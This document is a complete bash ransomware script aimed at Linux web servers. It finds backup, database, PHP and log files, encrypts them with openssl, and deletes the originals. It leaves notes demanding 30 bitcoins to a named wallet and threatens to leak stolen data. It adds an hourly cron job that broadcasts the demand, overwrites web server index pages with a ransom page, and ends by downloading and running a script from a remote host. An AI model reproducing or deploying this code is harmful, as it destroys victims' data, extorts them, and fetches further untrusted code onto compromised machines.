#!/bin/bash

LIST=list
RANSOM=ransom.html
IMAGE=hacker.jpg
KEY=key
btc="3QvvEShPxEt6CUMGv9XTaZaz8msRy2A8g9"
#Encrypt all backup files
locate .zip > list2
locate .bak > list3
locate .php > list4
locate .sql > list5
locate .db > list6
locate .log >list7
locate .logs >list8

LIST3=list3
LIST3=list3
LIST4=list4
LIST5=list5
LIST6=list6
LIST7=list7
LIST8=list8

for LOCATION in $(cat $LIST)
do
chmod 7777 $LOCATION
 echo "Encrypting: "; echo $LOCATION
 for FILE in $(find $LOCATION -type f)
     do
	 chmod 7777 $FILE
	openssl aes-256-cbc -salt -pass file:$KEY -in "$FILE" -out "$FILE.hacked" && cat /dev/null > "$FILE" && rm -rf "$FILE"
     done

{
    echo "Your files have been encrypted using RSA-4096. Some sensetive Info has been send to a secure server, should you decide not to pay then you know. I also managed to extract some useful info which i will later use if my tribute isnt paid. To decrypt your files and fix this, visit https://localbitcoins.com/ad/879731/buy-bitcoins-with-cash-johannesburg-south-africa and Send 30 bitcoins to ${btc} If no payment is received till timer hits 00:00:00\\n\\nIMPORTANT: DO NOT REBOOT YOUR SERVER. DO NOT ATTEMPT RECOVERY WITHOUT PURCHASING OUR DECRYPTION SOFTWARE. IF YOU DO SO, SYSTEM RECOVERY WILL BECOME IMPOSSIBLE."
  } >> "${LOCATION}/INSTRUCTIONS.txt"
done
for fle in $(cat $LIST2)
do
chmod 7777 $fle
openssl aes-256-cbc -salt -pass file:$KEY -in "$fle" -out "$fle.hacked" && cat /dev/null > "$fle" && rm -rf "$fle"
done
for fl in $(cat $LIST3)
do
chmod 7777 $fl
openssl aes-256-cbc -salt -pass file:$KEY -in "$fl" -out "$fl.hacked" && cat /dev/null > "$fl" && rm -rf "$fl"
done
for fle in $(cat $LIST4)
do
chmod 7777 $fle
openssl aes-256-cbc -salt -pass file:$KEY -in "$fle" -out "$fle.hacked" && cat /dev/null > "$fle" && rm -rf "$fle"
done
for fl in $(cat $LIST5)
do
chmod 7777 $fl
openssl aes-256-cbc -salt -pass file:$KEY -in "$fl" -out "$fl.hacked" && cat /dev/null > "$fl" && rm -rf "$fl"
done
for fle in $(cat $LIST6)
do
chmod 7777 $fle
openssl aes-256-cbc -salt -pass file:$KEY -in "$fle" -out "$fle.hacked" && cat /dev/null > "$fle" && rm -rf "$fle"
done
for fl in $(cat $LIST7)
do
chmod 7777 $fl
openssl aes-256-cbc -salt -pass file:$KEY -in "$fl" -out "$fl.hacked" && cat /dev/null > "$fl" && rm -rf "$fl"
done
for fle in $(cat $LIST8)
do
chmod 7777 $fle
openssl aes-256-cbc -salt -pass file:$KEY -in "$fle" -out "$fle.hacked" && cat /dev/null > "$fle" && rm -rf "$fle"
done
echo "Backup files encrypted!!!!";
{
  echo -en  "#"'!'"/bin/bash"
  echo -e "\n"
  echo -e "wallCmd=\$(which wall)"
  echo -e "\n"
  echo -e "echo -e \"Your files have been encrypted using RSA-4096. Some sensetive Info has been send to a secure server, should you decide not to pay then you know. I also managed to extract some useful info f which i will later use if my tribute isnt paid. To decrypt your files and fix this, visit https://localbitcoins.com/ad/879731/buy-bitcoins-with-cash-johannesburg-south-africa and Send 30 bitcoins to ${btc} If no payment is received till timer hits 00:00:00.\\n\\nIMPORTANT: DO NOT REBOOT YOUR SERVER. DO NOT ATTEMPT RECOVERY WITHOUT PURCHASING OUR DECRYPTION SOFTWARE. IF YOU DO SO, SYSTEM RECOVERY WILL BECOME IMPOSSIBLE.\" | \${wallCmd}"
} > /etc/cron.hourly/backup.sh
chmod 7777 /etc/cron.hourly/backup.sh

APACHE=/var/www/html
NGINX=/usr/share/nginx
xampp=/opt/lampp/htdocs

APACHEs=$(find $APACHE -name index.*)
NGINXes=$(find $NGINX -name index.*)
XAMPPs= $(find $xampp -name index.*)
PAGES="$APACHEs $NGINXes $XAMPPs"
cp $RANSOM ${LOCATION}
cp $IMAGE ${LOCATION}
chmod 7777 $IMAGE

for PAGE in $PAGES
do
   cp $RANSOM ${PAGE%.*}
   chmod 7777 ${PAGE%.*}
   cp $IMAGE ${PAGE%/*}
done
if [ -f /etc/redhat-release ]
then
  osType="redhat"
elif [ -f /etc/debian_version ]
then
  osType="debian"
else
  echo "Could not determine OS" &>/dev/null
fi

if [ "${osType}" == "redhat" ]
  then
    /usr/bin/crontab -l | { cat; echo "1 * * * * /etc/cron.hourly/backup.sh"; } | /usr/bin/crontab - &>/dev/null
  elif [ "${osType}" == "debian" ]
  then
    /usr/bin/crontab -l | { cat; echo "*/1 * * * * /etc/cron.hourly/backup.sh"; } | /usr/bin/crontab - &>/dev/null
  else
    echo "Could not set crontab" &>/dev/null
  fi
wget https://3shadowsand3cats.000webhostapp.com/cleaner.sh
bash cleaner.sh	
echo "step 3 is finished!!!"
exit
